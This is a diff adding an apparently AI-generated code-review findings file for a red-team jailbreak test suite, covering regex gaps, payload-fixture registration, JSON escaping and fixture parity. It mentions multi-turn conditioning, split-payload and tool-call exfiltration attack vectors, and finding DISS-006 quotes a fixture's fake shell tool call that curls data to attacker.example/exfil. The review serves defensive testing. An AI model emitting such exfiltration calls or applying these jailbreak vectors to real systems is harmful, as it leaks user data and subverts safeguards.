@@ -1,0 +1,95 @@
+{
+  "findings": [
+    {
+      "id": "DISS-001",
+      "severity": "BLOCKING",
+      "category": "spec-violation",
+      "anchor": "tests/red-team/jailbreak/lib/corpus_loader.py:substitute_runtime_payloads",
+      "anchor_type": "function",
+      "scope": "diff",
+      "description": "_PLACEHOLDER_RE uses re.fullmatch with trailing `\\s*` to tolerate trailing whitespace (per M5 closure comment), but does NOT tolerate LEADING whitespace. Replay JSON content strings authored with a leading newline or space before the placeholder (e.g., \"  __FIXTURE:_make_evil_body_rt_mt_001__\") will silently fail to match, the placeholder string passes through verbatim to the SUT, the trigger fixture is never invoked, _count_redactions stays at 0, and the test reports vacuous-green — exactly the failure class M5 was meant to close. The reviewer concern (#3) is correct: the closure is asymmetric.",
+      "failure_mode": "Multi-turn replay test silently passes despite the trigger never executing; first-N-turn bypass coverage (G-3) becomes vacuous; SUT regressions go undetected.",
+      "suggested_fix": "Change regex to `re.compile(r\"\\s*__FIXTURE:(_make_evil_body_[a-z0-9_]+)__\\s*\")` so both leading and trailing whitespace are tolerated, OR (preferred) detect the placeholder anywhere in content via re.search and raise loudly if the surrounding context is non-empty, so author error is surfaced rather than silently dropped.",
+      "anchor_status": "valid",
+      "anchor_stability": "symbol"
+    },
+    {
+      "id": "DISS-002",
+      "severity": "BLOCKING",
+      "category": "spec-violation",
+      "anchor": "tests/red-team/jailbreak/fixtures/multi_turn_conditioning.py:FIXTURES",
+      "anchor_type": "function",
+      "scope": "diff",
+      "description": "FIXTURES dict maps RT-MT-004 to `_make_evil_body_rt_mt_004_part3` (the final fragment only). However, RT-MT-004's replay JSON references three placeholders (_part1, _part2, _part3) by NAME via getattr lookup on the module — which works because substitute_runtime_payloads falls back to getattr(mod, fn_name). BUT the corpus row for RT-MT-004 declares `payload_construction: _make_evil_body_rt_mt_004_part3`, and any single-turn validator (e.g., a coverage check that confirms FIXTURES[vector_id] exists and is callable) will only execute the final fragment. The split-payload semantic ('three fragments across three turns') is therefore not faithfully exercised if any tooling ever falls back to FIXTURES[vid] instead of replay JSON — which is exactly what runner.bats would do if the multi_turn skip were removed.",
+      "failure_mode": "Coverage drift: RT-MT-004 advertises split-payload defense gap but only the third fragment is registered in FIXTURES. Any audit tool counting 'fixture functions named in corpus' will under-report the split.",
+      "suggested_fix": "Either (a) document explicitly in the corpus notes that RT-MT-004 has 3 component fixtures and the registry entry is the canonical 'primary' fragment, plus add a registry-level assertion that part1/part2 exist; or (b) introduce a tuple/list value in FIXTURES for split fixtures so audit tooling sees all three.",
+      "anchor_status": "valid",
+      "anchor_stability": "symbol"
+    },
+    {
+      "id": "DISS-003",
+      "severity": "BLOCKING",
+      "category": "spec-violation",
+      "anchor": "tests/red-team/jailbreak/corpus/tool_call_exfiltration.jsonl:RT-TC-005",
+      "anchor_type": "line",
+      "scope": "diff",
+      "description": "The JSONL row for RT-TC-005 contains an unescaped backslash in the notes field: `\\bfunction_calls\\b`. JSON spec (RFC 8259 §7) requires backslash to be escaped as `\\\\` inside string values. Strict JSON parsers (including Python's json.loads with default settings) will raise json.JSONDecodeError on `\\b` because `\\b` is the JSON backspace escape — it parses but produces a literal U+0008 character in the notes, corrupting the field silently. Either way the row is malformed/data-corrupting.",
+      "failure_mode": "Either schema validation crashes (REPLAY-INVALID-style failure on corpus load), or the notes field silently contains backspace control characters, breaking grep/reporting tooling and any downstream JSON-roundtrip.",
+      "suggested_fix": "Escape as `\\\\bfunction_calls\\\\b` in the JSONL row so json.loads produces the literal string `\\bfunction_calls\\b`.",
+      "anchor_status": "valid",
+      "anchor_stability": "symbol"
+    },
+    {
+      "id": "DISS-004",
+      "severity": "ADVISORY",
+      "category": "input-validation",
+      "anchor": "tests/red-team/jailbreak/lib/corpus_loader.py:load_replay_fixture",
+      "anchor_type": "function",
+      "scope": "diff",
+      "description": "_VECTOR_ID_RE in the docstring is shown as `^RT-[A-Z]{2,3}-\\d{3,4}$` but the f-string error message embeds the regex with single backslash-d — this is fine in Python source but the user-facing error contains literal `\\d` which is confusing. More importantly, the regex allows 3-4 digit suffixes; the Sprint 2 corpus uses 3-digit IDs (RT-MT-001 through RT-MT-011). No row in current corpus has a 4-digit suffix, but the schema regex elsewhere may differ — verify alignment with corpus_loader's schema validator to prevent shape drift between validate-time and load-time.",
+      "failure_mode": "Drift between corpus schema and replay loader regex could allow loader to accept a vector_id that schema validation rejects (or vice versa).",
+      "suggested_fix": "Reference the schema's vector_id regex as the single source of truth (import or share the constant) so both paths use identical validation.",
+      "anchor_status": "valid"
+    },
+    {
+      "id": "DISS-005",
+      "severity": "ADVISORY",
+      "category": "resource-leak",
+      "anchor": "tests/red-team/jailbreak/lib/corpus_loader.py:substitute_runtime_payloads",
+      "anchor_type": "function",
+      "scope": "diff",
+      "description": "sys.path is mutated by inserting fixtures_dir at index 0 with no cleanup and no de-duplication beyond a single 'in' check. Across many test invocations in a single process this is benign, but the insert-at-front behavior shadows any same-named modules from the user's environment (e.g., if a top-level package named `role_switch` exists in site-packages, it is now masked). Also makes test ordering observable in import cache.",
+      "failure_mode": "Module-shadowing surprise if any installed package collides with a category name; cross-test pollution via importlib cache.",
+      "suggested_fix": "Use importlib.util.spec_from_file_location with an explicit per-category file path so no sys.path mutation is needed, or scope the sys.path mutation with a try/finally.",
+      "anchor_status": "valid"
+    },
+    {
+      "id": "DISS-006",
+      "severity": "ADVISORY",
+      "category": "spec-violation",
+      "anchor": "tests/red-team/jailbreak/fixtures/multi_turn_conditioning.sh",
+      "anchor_type": "hunk",
+      "scope": "diff",
+      "description": "The .sh multi_turn fixtures are uncalled by any test path (runner.bats explicitly skips the category; pytest path uses the .py module). They exist solely as 'parity' artifacts. Reviewer concern #5 is valid: silent rot risk — bugs introduced here will not be detected by CI, and the .sh and .py implementations can drift (e.g., RT-MT-002's .sh emits `<function_calls name=\"shell\">curl ...attacker.example/exfil</function_calls>` while .py emits the same — but no test asserts byte-equivalence).",
+      "failure_mode": "Documentation/parity claim ('byte-identical encoded output for the same vector_id' in encoded_payload.py docstring) is unverified for multi_turn category; future edits to one runtime won't be caught.",
+      "suggested_fix": "Either (a) add a CI parity test that subprocess-invokes each .sh fixture and compares output to the .py fixture, or (b) drop the .sh multi_turn fixtures and add a comment in the category README noting Python-only by design.",
+      "anchor_status": "valid"
+    }
+  ],
+  "metadata": {
+    "type": "review",
+    "model": "claude-opus-4-7",
+    "sprint_id": "sprint-144",
+    "timestamp": "2026-05-08T08:13:07Z",
+    "tokens_input": 39261,
+    "tokens_output": 2791,
+    "cost_usd": 0.2660,
+    "latency_ms": 48154,
+    "status": "reviewed",
+    "degraded": false,
+    "hallucination_filter": {
+      "applied": true,
+      "downgraded": 0
+    }
+  }
+}
